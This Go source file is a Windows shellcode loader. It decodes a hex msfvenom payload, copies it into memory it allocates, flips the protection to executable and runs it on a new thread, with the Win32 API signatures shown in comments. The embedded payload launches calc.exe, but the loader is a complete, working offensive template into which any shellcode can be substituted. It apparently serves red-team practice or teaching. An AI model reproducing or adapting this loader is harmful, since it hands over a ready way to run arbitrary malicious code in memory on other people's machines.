package main

import (
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT        = 0x00001000
	MEM_RESERVE       = 0x00002000
	MEM_RESET         = 0x00080000
	MEM_RESET_UNDO    = 0x1000000
	MEM_LARGE_PAGES   = 0x20000000
	MEM_PHYSICAL      = 0x00400000
	MEM_TOP_DOWN      = 0x00100000
	MEM_WRITE_WATCH   = 0x00200000
	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20
)

func main() {

	kernel32 := syscall.NewLazyDLL("Kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	
	//msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f hex
	sc_hex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	sc, err := hex.DecodeString(sc_hex)
	if err != nil {
		fmt.Println("Error in SC")
	}

	/*LPVOID VirtualAlloc(
	  		LPVOID lpAddress,
	  		SIZE_T dwSize,
	  		DWORD  flAllocationType,
	  		DWORD  flProtect
			);*/

	/*void RtlCopyMemory(
	   		void*       Destination,
	   		const void* Source,
	   		size_t      Length
		);*/

	/*BOOL VirtualProtect(
	  		LPVOID lpAddress,
	  		SIZE_T dwSize,
	  		DWORD  flNewProtect,
	  		PDWORD lpflOldProtect
		);*/

	/*CreateThread
			LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	  		SIZE_T                  dwStackSize,
	  		LPTHREAD_START_ROUTINE  lpStartAddress,
	  		__drv_aliasesMem LPVOID lpParameter,
	  		DWORD                   dwCreationFlags,
	  		LPDWORD                 lpThreadId
		);*/

	addr, _, _ := VirtualAlloc.Call(
		uintptr(0),
		uintptr(len(sc)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE)

	RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(
		addr,
		uintptr(len(sc)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := CreateThread.Call(
		0,
		0,
		addr,
		uintptr(0),
		0,
		0)

	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
